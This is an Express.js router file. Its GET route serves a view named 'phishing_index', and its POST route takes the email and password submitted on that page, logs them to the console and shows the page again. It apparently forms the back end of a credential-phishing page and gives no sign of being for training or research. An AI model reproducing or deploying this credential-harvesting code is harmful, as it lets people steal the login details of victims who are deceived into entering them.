var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('phishing_index', { title: 'Express' });
});

router.post('/',function(req,res,next){
  console.log("YOLO");
  console.log(req.body.email);
  console.log(req.body.pass);
  res.render('phishing_index', { title: 'Express' });
});

module.exports = router;
